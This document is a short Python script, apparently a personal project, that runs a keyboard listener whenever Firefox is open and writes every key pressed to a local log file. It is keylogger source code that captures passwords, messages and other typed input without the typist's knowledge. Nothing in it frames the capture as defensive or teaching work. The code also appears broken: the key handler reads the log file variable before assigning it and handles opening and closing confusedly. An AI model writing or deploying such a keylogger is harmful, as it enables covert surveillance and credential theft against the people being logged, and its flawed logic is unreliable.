""" from AppOpener import open,close """
from pynput import keyboard
import psutil
import time

def checkStatus():
    firefoxstatus = "firefox.exe" in (i.name() for i in psutil.process_iter())
    if(firefoxstatus):
        return True
    else:
        return False

def on_key_press(key):
    #reason that there is a check here, is to quit from the listener when firefox closes. 
    if(checkStatus()):
        #write keys to file from here
        if(logfile.closed == False):
            logfile = open(file="read_from_log.txt",mode='w')
            logfile.write("first")
            logfile.close()
            logfile = open(file="read_from_log.txt",mode='a')
        k = str(key)
        logfile.write(k)
    else:
        logfile.close()
        return False

while(True):
    if(checkStatus()):
        logfile = open(file="read_from_log.txt",mode='w')
        
        with keyboard.Listener(on_press=on_key_press) as listener:
            listener.join()
            
    time.sleep(2)
